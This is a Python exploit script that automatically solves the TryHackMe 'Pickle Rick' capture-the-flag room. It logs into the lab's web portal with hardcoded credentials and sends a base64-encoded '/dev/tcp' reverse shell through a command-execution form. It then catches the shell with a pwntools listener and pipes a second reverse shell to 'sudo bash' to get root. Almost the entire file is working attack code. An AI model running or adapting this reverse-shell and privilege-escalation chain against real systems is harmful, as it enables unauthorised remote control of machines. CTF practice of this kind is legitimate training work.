#!/usr/bin/env python3

# autopwn script for the room Pickle Rick on Try Hack Me

import sys
import requests
import base64
import threading
from pwn import *
import time

if len(sys.argv) != 4:
	print("Usage:   ./PicleRick.py [TARGET IP] [LHOST:LPORT] [PORT TO GET ROOT SHELL]")
	print("EXample: ./PicleRick.py 192.168.0.1 192.168.0.100:1234 12345")
	sys.exit(1)

	#target ip, local host, local port
TARGETIP = sys.argv[1]
LHOST = sys.argv[2].split(":")[0]
LPORT = sys.argv[2].split(":")[1]
ROOTPORT = sys.argv[3]

	# function to handle the web shell
def rev_shell():

		# login creds
	data = {
    	'username': 'R1ckRul3s',
    	'password': 'Wubbalubbadubdub',
    	'sub': 'Login',
	}
	
		# web session
	s = requests.Session()
	cookies = s.get('https://10-10-50-140.p.thmlabs.com/login.php').cookies.get_dict()
	login = s.post('https://10-10-50-140.p.thmlabs.com/login.php', cookies=cookies, data=data)

		# rev shell
	cmd = f"sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1" # the rev shell command
	encoded_cmd = (base64.b64encode(cmd.encode())).decode() # encode the cmd

		# data to send
	data1 = {
    	'command': f'echo {encoded_cmd} | base64 -d | bash',
    	'sub': 'Execute',
	}

	response1 = requests.post('https://10-10-50-140.p.thmlabs.com/portal.php', cookies=cookies, data=data1)

if __name__ == "__main__":
	try:
		t1 = threading.Thread(target=rev_shell) # handle the web shell request
		t1.daemon = True
		t1.start()

		print(f"[*] Open a listener on port {ROOTPORT} to get the root shell")
		listener = listen(LPORT)
		time.sleep(3)
		listener.sendline(bytes(f"echo 'sh -i >& /dev/tcp/{LHOST}/{ROOTPORT} 0>&1' | sudo bash", 'utf8')) # privesc

	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print("error")
		sys.exit(1)

# kmbh1WaL5ibpZHbhNkL2YzQ2YkN3cDew4iZs92duAkLy9Ga0VXY